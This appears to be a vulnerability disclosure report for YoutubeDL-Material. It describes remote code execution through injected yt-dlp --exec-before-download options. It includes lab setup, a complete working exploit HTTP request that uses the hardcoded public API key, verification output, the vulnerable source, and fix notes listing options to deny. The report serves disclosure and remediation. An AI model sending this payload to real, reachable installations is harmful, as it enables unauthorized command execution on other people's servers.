### Vulnerability details

**Official website / Product:** https://github.com/Tzahi12345/YoutubeDL-Material

**Repository:** Tzahi12345/YoutubeDL-Material (stars at selection: 3198)

**Vulnerability type:** RCE / getshell (yt-dlp `--exec` / `--exec-before-download` argv injection via `customArgs` / `additionalArgs`)

**Vulnerability versions:** Docker `tzahi12345/youtubedl-material:latest` (app banner v4.3.2; image revision `13a03a722c565b7fb21bf8977765e5968afc4a0d`); also present on current master `28234c0d4ba65059be18f3692f6f5e5b1170b1a6`

**Vulnerability URL / Parameter:** `POST /api/downloadFile?apiKey=...` JSON fields `customArgs` and/or `additionalArgs` (delimiter `,,`); dangerous values such as `--exec-before-download` / `--exec`

**Complex:** yes

### Verification procedure

1. **Start the lab.** Original path `labs/YoutubeDL-Material-r66-a4/` and the image may already be torn down (see `lab_images_removed` in `logs/merged/r66-a4.json`). Rebuild with the equivalent compose below: image `tzahi12345/youtubedl-material:latest` (app banner **v4.3.2**, revision `13a03a7`), container `ytdl-r66-a4`, host **24604→17442**, single-user local DB (`ytdl_use_local_db=true`, no JWT / Mongo).

```yaml
# Save as docker-compose.yml then: docker compose up -d
# Lab: ytdl-r66-a4, host 24604→17442, ytdl_use_local_db=true
services:
  ytdl_material:
    container_name: ytdl-r66-a4
    image: tzahi12345/youtubedl-material:latest
    environment:
      ytdl_use_local_db: "true"
      write_ytdl_config: "true"
    ports:
      - "24604:17442"
    restart: "no"
```

Expected compose start log fragment:

```
Container ytdl-r66-a4  Creating
Container ytdl-r66-a4  Created
Container ytdl-r66-a4  Starting
Container ytdl-r66-a4  Started
```

Wait until the UI/API listens on 17442. Default config uses `default_downloader=yt-dlp`. The only API gate is the `apiKey` query param; the accepted key is the hardcoded public constant (step 4).

2. **(Required) Pin the yt-dlp binary.** The stock `latest` image may ship a yt-dlp build that needs Python≥3.11 while the container has Python 3.10, so downloads fail. The bug is in application argv construction, not the yt-dlp version; the lab pinned `appdata/bin/yt-dlp` to **2024.12.23** (supports 3.10) for a functional verify:

```bash
docker exec -u root ytdl-r66-a4 bash -lc '
  mkdir -p /app/appdata/bin
  curl -fsSL -o /app/appdata/bin/yt-dlp \
    https://github.com/yt-dlp/yt-dlp/releases/download/2024.12.23/yt-dlp
  chmod 755 /app/appdata/bin/yt-dlp
  chown youtube:youtube /app/appdata/bin/yt-dlp
  /app/appdata/bin/yt-dlp --version
'
```

3. **Serve a reachable media URL inside the container.** `--exec-before-download` runs during yt-dlp preprocessing, but a reachable media URL is still needed to trigger the download job. The lab served a tiny mp4 with Python inside the container:

```bash
# On the host, create a tiny valid mp4 (requires ffmpeg), then copy it in:
ffmpeg -y -f lavfi -i color=c=black:s=16x16:d=0.1 -c:v libx264 -t 0.1 /tmp/tiny.mp4
docker exec -u youtube ytdl-r66-a4 bash -lc '
  mkdir -p /tmp/ydlm-media
  python3 -m http.server 9999 --bind 127.0.0.1 >/tmp/ydlm-http.log 2>&1 &
  echo $!
'
docker cp /tmp/tiny.mp4 ytdl-r66-a4:/tmp/ydlm-media/tiny.mp4
```

In-container URL: `http://127.0.0.1:9999/tiny.mp4` (matches the PoC).

4. Use the hardcoded public API key from source (`admin_token` in `backend/app.js` / `src/app/posts.services.ts`): `4241b401-7236-493e-92b5-b72696b9d853`.

5. Send the full `POST /api/downloadFile?apiKey=...` below (`customArgs` contains `--exec-before-download,,sh -c id>...`). The same payload works in `additionalArgs` (same sink).

6. Confirm impact inside the container:

```bash
docker exec ytdl-r66-a4 cat /tmp/TMP-r66a4-1-id.txt
docker exec ytdl-r66-a4 ls -la /tmp/TMP-r66a4-1-id.txt /tmp/TMP-r66a4-1-pwned
```

Expect `uid=1000(youtube) gid=1000(youtube) groups=1000(youtube)` and the marker file.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /api/downloadFile?apiKey=4241b401-7236-493e-92b5-b72696b9d853 HTTP/1.1
Host: 127.0.0.1:24604
User-Agent: r66-a4-poc/1.0
Accept: application/json
Content-Type: application/json
Content-Length: 207
Connection: close

{"url":"http://127.0.0.1:9999/tiny.mp4","type":"video","customArgs":"--exec-before-download,,sh -c id>/tmp/TMP-r66a4-1-id.txt;touch /tmp/TMP-r66a4-1-pwned,,-o,,/tmp/ydlm-poc.%(ext)s,,-f,,b,,--ignore-config"}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization
Access-Control-Allow-Origin: http://example.com
Content-Type: application/json; charset=utf-8
Content-Length: 510
ETag: W/"1fe-G6fLyY17h5jBppyKlM+dKZ5mcJQ"
Vary: Accept-Encoding
Set-Cookie: connect.sid=s%3ALxgtM8eFFa6DiNIhNmI7rW8lJUnpB6oC.z5%2B%2B1TQs%2B1ehUm0kDjl3hSyTUGBvXVyJYj0JEyiF%2FDo; Path=/; HttpOnly
Date: Mon, 02 Nov 2026 17:42:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"download":{"url":"http://127.0.0.1:9999/tiny.mp4","type":"video","title":"","user_uid":null,"sub_id":null,"sub_name":null,"prefetched_info":null,"options":{"customArgs":"--exec-before-download,,sh -c id>/tmp/TMP-r66a4-1-id.txt;touch /tmp/TMP-r66a4-1-pwned,,-o,,/tmp/ydlm-poc.%(ext)s,,-f,,b,,--ignore-config"},"uid":"9279325b-e0e7-431c-b896-004912ae9b59","step_index":0,"paused":false,"running":false,"finished_step":true,"error":null,"percent_complete":null,"finished":false,"timestamp_start":1793641329987}}
```

Verification result notes:

Download is accepted (`HTTP 200` + download job object). yt-dlp then executes the injected `--exec-before-download` shell command during preprocessing. Inside the container (verified):

```bash
# docker exec ytdl-r66-a4 cat /tmp/TMP-r66a4-1-id.txt
uid=1000(youtube) gid=1000(youtube) groups=1000(youtube)

# docker exec ytdl-r66-a4 ls -la /tmp/TMP-r66a4-1-id.txt /tmp/TMP-r66a4-1-pwned
-rw-r--r-- 1 youtube youtube 57 Nov  2 17:42 /tmp/TMP-r66a4-1-id.txt
-rw-r--r-- 1 youtube youtube  0 Nov  2 17:42 /tmp/TMP-r66a4-1-pwned
```

Marker file `/tmp/TMP-r66a4-1-pwned` is created. The same RCE also works with `additionalArgs` instead of `customArgs` (same sink); verified in-container:

```bash
# docker exec ytdl-r66-a4 cat /tmp/TMP-r66a4-addargs
uid=1000(youtube) gid=1000(youtube) groups=1000(youtube)
```

### Vulnerability analysis

YoutubeDL-Material forwards attacker-controlled download options into the yt-dlp argv array. `POST /api/downloadFile` copies `req.body.customArgs` / `additionalArgs` into the download job with **no server-side permission check** for `advanced_download` and **no denylist** for dangerous yt-dlp options such as `--exec` / `--exec-before-download` (which run a shell command).

In default single-user mode, `optionalJwt` does not require a JWT. The only gate is `?apiKey=`, and the accepted key is a **hardcoded constant published in the repository** (`4241b401-7236-493e-92b5-b72696b9d853` — `admin_token` in `backend/app.js`; middleware allows `req.query.apiKey === admin_token`). Anyone who can reach the HTTP port can therefore inject yt-dlp exec options and achieve RCE as the app user (`youtube` in Docker).

`generateArgs()` either replaces the entire argv with `customArgs.split(',,')` or injects `additionalArgs` via `utils.injectArgs`. `filterArgs()` only removes audio/video-incompatible flags — it does **not** strip `--exec*`. The code even lists `--exec` in `YTDL_ARGS_WITH_VALUES` (so injectArgs treats it as a valued option) without ever blocking it.

On current master, args are executed with `execa(bin, [url, ...args])` (no shell for argv splitting, but yt-dlp itself runs `--exec*` through a shell). On the verified Docker v4.3.2 image, `youtubedl.exec(url, args)` from the `youtube-dl` npm wrapper is used; the injected `--exec-before-download` still reaches yt-dlp and executes.

Trigger / sink source (full path and line numbers):

```javascript
# File: backend/app.js
# Lines: 720-739 (master 28234c0); Docker image ~812-818
# Hardcoded admin_token: backend/app.js:54
app.post('/api/downloadFile', optionalJwt, async function(req, res) {
    req.setTimeout(0);
    const url = req.body.url;
    const type = req.body.type ? req.body.type : 'video';
    const user_uid = req.isAuthenticated() ? req.user.uid : null;
    const options = {
        customArgs: req.body.customArgs,
        additionalArgs: req.body.additionalArgs,
        // ...
    };
    const download = await downloader_api.createDownload(url, type, options, user_uid);
    // ...
});
```

```javascript
# File: backend/downloader.js
# Lines: 476-477, 534-535, 552-553 (master)
if (customArgs) {
    downloadConfig = customArgs.split(',,');
} else {
    // ...
    if (options.additionalArgs && options.additionalArgs !== '') {
        downloadConfig = utils.injectArgs(downloadConfig, options.additionalArgs.split(',,'));
    }
}
// filter out incompatible args (audio/video only — NOT --exec)
downloadConfig = filterArgs(downloadConfig, is_audio);
```

```javascript
# File: backend/youtube-dl.js
# Lines: 63 (master); binary path appdata/bin/<fork>
const child_process = execa(getYoutubeDLPath(youtubedl_fork), [url, ...args], {maxBuffer: Infinity});
```

```javascript
# File: backend/consts.js
# Lines: 351 (master) / 346 (Docker image)
'--exec',  // listed as valued arg for injectArgs; never denylisted
```

```typescript
# File: src/app/posts.services.ts
# Line: 135
auth_token = '4241b401-7236-493e-92b5-b72696b9d853';
```

### Fix notes

1. Deny dangerous yt-dlp options server-side (`--exec`, `--exec-before-download`, `--config-location`, `--ffmpeg-location`, `--external-downloader`, `--load-info-json`, `--batch-file`, etc.) regardless of UI flags.
2. Enforce `advanced_download` (and preferably admin-only) with `auth_api.userHasPermission` before accepting `customArgs` / `additionalArgs` / `customOutput`.
3. Replace the hardcoded API key with a per-install secret; do not ship a public default that unlocks mutating APIs.
4. Prefer allowing only a documented safe subset of yt-dlp flags (allowlist), not an open-ended passthrough.
